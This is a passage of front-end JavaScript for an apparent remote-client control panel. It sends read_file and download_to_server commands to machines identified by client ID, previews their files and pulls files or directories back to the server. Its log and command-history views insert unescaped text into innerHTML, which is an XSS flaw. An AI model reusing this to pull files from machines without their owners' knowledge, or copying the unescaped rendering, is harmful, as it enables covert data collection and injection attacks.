  $('previewBody').innerHTML = '<div class="preview-empty">正在读取文件内容...</div>';
  apiPost('send_command', {client_id:currentClientId, command:{type:'read_file', data:path}})
    .then(r=>r.json())
    .then(d=>{
      if(!d.success){
        $('previewBody').innerHTML='<div class="preview-binary">读取请求发送失败</div>';
        return;
      }
      pollFilePreview(path, d.command_id);
    })
    .catch(()=>{
      $('previewBody').innerHTML='<div class="preview-binary">网络错误</div>';
    });
}

function pollFilePreview(path, commandId) {
  let attempts = 0;
  const t = setInterval(()=>{
    attempts++;
    if(attempts > 30){
      clearInterval(t);
      if(currentPreviewPath === path) $('previewBody').innerHTML='<div class="preview-binary">读取超时</div>';
      return;
    }
    const extra = commandId
      ? ('client_id='+currentClientId+'&command_id='+commandId)
      : ('command=read_file&client_id='+currentClientId+'&path='+encodeURIComponent(path)+'&limit=10');
    apiGet('get_command_results', extra)
      .then(r=>r.json())
      .then(d=>{
        if(!(d.success && d.data && d.data.length)) return;
        for(const item of d.data){
          if(!commandId && item.id <= lastPreviewPollId) continue;
          let data = item.result;
          if(typeof data === 'string'){
            try { data = JSON.parse(data); } catch(e) { continue; }
          }
          if(!data) continue;
          lastPreviewPollId = item.id;
          clearInterval(t);
          if(currentPreviewPath === path) renderPreview(data);
          break;
        }
      })
      .catch(()=>{});
  }, 1500);
}

function renderPreview(data) {
  $('previewTitle').textContent = data.name || '文件预览';
  $('previewMeta').textContent = (data.path || '') + ' · ' + formatSize(data.size || 0) + (data.truncated ? ' · 已截断预览' : '');
  if(data.error){
    $('previewBody').innerHTML='<div class="preview-binary">'+escapeHtml(data.error)+'</div>';
    return;
  }
  if(data.kind === 'image' && data.content){
    const mime = data.mime || 'image/jpeg';
    $('previewBody').innerHTML = '<div class="preview-image"><img alt="preview" src="data:'+mime+';base64,'+data.content+'"></div>';
    return;
  }
  if(data.kind === 'text'){
    $('previewBody').innerHTML = '<div class="preview-text">'+escapeHtml(data.content || '')+'</div>';
    return;
  }
  $('previewBody').innerHTML = '<div class="preview-binary">这是二进制文件，当前仅显示基础信息。<br>文件大小：'+formatSize(data.size || 0)+(data.truncated ? '<br>已读取部分内容用于识别。' : '')+'</div>';
}

function cancelDownload() {
  if(window._dlTimer) clearInterval(window._dlTimer);
  $('dlOverlay').classList.add('hidden');
}

function downloadFile(path, fileSize) {
  if(!currentClientId) return;
  path = normalizeWindowsPath(path, false);
   // 自动切换到终端
  activateTab('terminal');
  const output=$('termOutput');
   output.innerHTML+=`[下载] 正在下载: ${path}`+(fileSize?` (${formatSize(fileSize)})`:'')+'\n';
  output.scrollTop=output.scrollHeight;
   // 使用 download_to_server 命令下载到服务器
  apiPost('send_command', {client_id:currentClientId, command:{type:'download_to_server', data:path}}).then(r=>r.json()).then(d=>{
    if(d.success) { toast('下载请求已发送'); pollDownloadToServerTerm(path, fileSize, d.command_id); }
    else { output.innerHTML+=`[错误] ${d.error||'发送失败'}\n`; }
  }).catch(e=>{ output.innerHTML+=`[网络错误]\n`; });
}

function pollDownloadToServerTerm(path, fileSize, commandId) {
  let attempts=0;
  const output=$('termOutput');
  const t=setInterval(()=>{
    attempts++;
    if(attempts>120){ clearInterval(t); output.innerHTML+=`[超时] 下载超时\n`; return; }
    const extra = commandId
      ? ('client_id='+currentClientId+'&command_id='+commandId)
      : ('command=download_to_server&client_id='+currentClientId);
    apiGet('get_command_results', extra).then(r=>r.json()).then(d=>{
      if(d.success&&d.data.length>0) for(const item of d.data){
        if(!commandId && item.id<=lastDownloadPollId) continue;
        lastDownloadPollId=item.id;
        try{
          const data=typeof item.result==='string'?JSON.parse(item.result||'{}'):item.result;
          if(data.error){ output.innerHTML+=`[错误] ${data.error}\n`; clearInterval(t); return; }
          if(data.type==='download_file'){
            output.innerHTML+=`[完成] 已保存到服务器: ${data.saved_as} (${formatSize(data.size||0)})\n`;
            clearInterval(t);
          } else if(data.type==='download_dir'){
            output.innerHTML+=`[完成] 目录已下载: ${data.files} 个文件\n`;
            clearInterval(t);
          }
          output.scrollTop=output.scrollHeight;
        }catch(e){}
      }
    }).catch(()=>{});
  }, 2000);
}

function formatSize(bytes) {
  if(!bytes) return '';
  const u=['B','KB','MB','GB','TB']; let i=0;
  while(bytes>=1024&&i<u.length-1){ bytes/=1024; i++; }
  return bytes.toFixed(i>0?1:0)+' '+u[i];
}

function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;')
    .replace(/'/g,'&#39;');
}

function normalizeWindowsPath(path, keepTrailingSlash) {
  let value = String(path ?? '').replace(/\//g, '\\').trim();
  if (!value) return value;
  value = value.replace(/\\+/g, '\\');
  if (/^[A-Za-z]:$/.test(value)) value += '\\';
  if (keepTrailingSlash) {
    if (/^[A-Za-z]:\\?$/.test(value)) return value.slice(0, 2) + '\\';
    if (!value.endsWith('\\')) value += '\\';
  } else if (value.length > 3) {
    value = value.replace(/\\+$/, '');
  }
  return value;
}

async function loadSystemLogs() {
  const level=$('logLevel').value;
    const r=await apiGet('get_system_logs','level='+level+'&limit=200'); const d=await r.json();
  const logs=$('systemLogs');
  if(d.success&&d.data.length>0){
    logs.innerHTML=d.data.map(l=>'<div class="log-line '+l.level+'">['+l.created_at+'] ['+l.level+'] '+l.message+' '+(l.context||'')+'</div>').join('');
    $('logCount').textContent=d.data.length+' 条';
  } else logs.innerHTML='<div style="color:#999;">暂无日志</div>';
}

async function loadCommandHistory() {
  if(!currentClientId) return;
  try {
    const r=await apiGet('get_logs','client_id='+currentClientId+'&limit=20'); const d=await r.json();
    if(d.success){
      $('cmdHistory').innerHTML=d.data.map(l=>{
        const cmdData=JSON.parse(l.command_data||'{}'); const resp=JSON.parse(l.response_data||'{}');
        const cmd=cmdData.data||l.command_type; const result=resp.output||resp.error||JSON.stringify(resp);
        return '<div class="cmd-history-item"><div class="cmd">'+cmd+'</div><pre class="cmd-result">'+result+'</pre></div>';
      }).join('');
    }
  }catch(e){}
}

initApp();
</script>
</body>
</html>



